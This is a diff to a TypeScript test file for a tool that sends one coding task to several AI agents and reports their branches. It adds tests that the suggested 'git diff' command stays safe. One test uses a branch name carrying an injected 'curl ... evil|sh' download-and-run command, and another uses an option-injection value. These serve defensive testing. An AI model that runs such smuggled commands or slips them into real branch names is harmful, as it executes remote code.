@@ -4,6 +4,7 @@ import {
   attemptBrief,
   attemptCountProblem,
   attemptKinds,
+  attemptBaseRef,
   attemptReportText,
   defaultRows,
   diffSummary,
@@ -177,12 +178,33 @@ describe('the report', () => {
     expect(text).toContain('交给了 2 份各做一遍')
     expect(text).toContain('— Claude Code · 做完了 · 分支 jacob/x-2 · +38 −12 · 3 个文件 · 测试 ✓')
     expect(text).toContain('— Gemini CLI · 任务没发出去 · 分支 jacob/x-3\n  没能创建 worktree')
-    expect(text).toContain('git diff jacob/x...<分支>')
+    expect(text).toContain('git diff refs/heads/jacob/x...<分支>')
+    // L6: a base from the repository goes into the command as one shell word, or is described.
+    expect(attemptReportText({ base: 'x;curl${IFS}evil|sh', members: [] })).toContain("git diff 'refs/heads/x;curl${IFS}evil|sh'...<分支>")
+    expect(attemptReportText({ base: '--output=/tmp/x', members: [] })).toContain('git diff <基线分支>...<分支>')
     expect(attemptReportText({ base: 'b', members: [{ label: 'Codex', branch: 'b-2', event: 'done', message: '改好了。' }] })).toContain('\n  改好了。\n')
     // Past the shared budget, a long result points to the member's terminal instead.
     const long = attemptReportText({ base: 'b', members: [1, 2, 3, 4].map((n) => ({ label: `A${n}`, branch: `b-${n}`, event: 'done' as const, message: 'x'.repeat(5_000) })) })
     expect(long).toContain('— A4 · 做完了 · 分支 b-4\n  （回复较长，看它的终端）')
     expect(text.endsWith('你接着做下一步。')).toBe(true)
+  })
+
+  // S1: parts started from a remote branch compare against its remote-tracking ref; refs/heads/<base> does not exist.
+  it('names a remote base by its remote-tracking ref in the comparison command', () => {
+    const branches: NewSessionBranch[] = [
+      { name: 'main', remote: false, worktreePath: null, inMainCheckout: true },
+      { name: 'origin/main', remote: true, worktreePath: null, inMainCheckout: false },
+      { name: 'origin/feature-x', remote: true, worktreePath: null, inMainCheckout: false }
+    ]
+    expect(attemptBaseRef('origin/feature-x', branches)).toBe('refs/remotes/origin/feature-x')
+    expect(attemptBaseRef('main', branches)).toBe('refs/heads/main')
+    // A local branch of the same name wins, as worktree creation resolves it.
+    expect(attemptBaseRef('origin/main', [...branches, { name: 'origin/main', remote: false, worktreePath: null, inMainCheckout: false }])).toBe('refs/heads/origin/main')
+    const remote = attemptReportText({ base: 'origin/feature-x', baseRef: 'refs/remotes/origin/feature-x', members: [] })
+    expect(remote).toContain('git diff refs/remotes/origin/feature-x...<分支>')
+    expect(remote).toContain('基于 origin/feature-x')
+    expect(attemptReportText({ base: 'main', baseRef: 'refs/heads/main', members: [] })).toContain('git diff refs/heads/main...<分支>')
+    expect(attemptReportText({ base: '--x', baseRef: 'refs/remotes/--x', members: [] })).toContain('git diff <基线分支>...<分支>')
   })
 })
 
@@ -228,6 +250,15 @@ describe('sanitizeAttemptGroups', () => {
     ])
     expect(sanitizeAttemptGroups([{ id: 'g1', prompt: 'p', base: 'b', createdAt: 1, members: ['s1', 's2'], reportTo: 's1' }], sessions)[0]?.reportTo).toBeUndefined()
     expect(sanitizeAttemptGroups([{ id: 'g1', prompt: 'p', base: 'b', createdAt: 1, members: ['s1'], reportTo: 'gone' }], sessions)[0]?.reportTo).toBeUndefined()
+  })
+
+  it('keeps the base’s full ref only when it is that base’s local or remote-tracking ref', () => {
+    const one = (baseRef: unknown) => sanitizeAttemptGroups([{ id: 'g1', prompt: 'p', base: 'origin/x', createdAt: 1, members: ['s1'], baseRef }], sessions)[0]?.baseRef
+    expect(one('refs/remotes/origin/x')).toBe('refs/remotes/origin/x')
+    expect(one('refs/heads/origin/x')).toBe('refs/heads/origin/x')
+    expect(one('refs/remotes/origin/y')).toBeUndefined()
+    expect(one('refs/tags/origin/x')).toBeUndefined()
+    expect(one(3)).toBeUndefined()
   })
 
   it('keeps valid groups and members that exist, each session in one group only', () => {
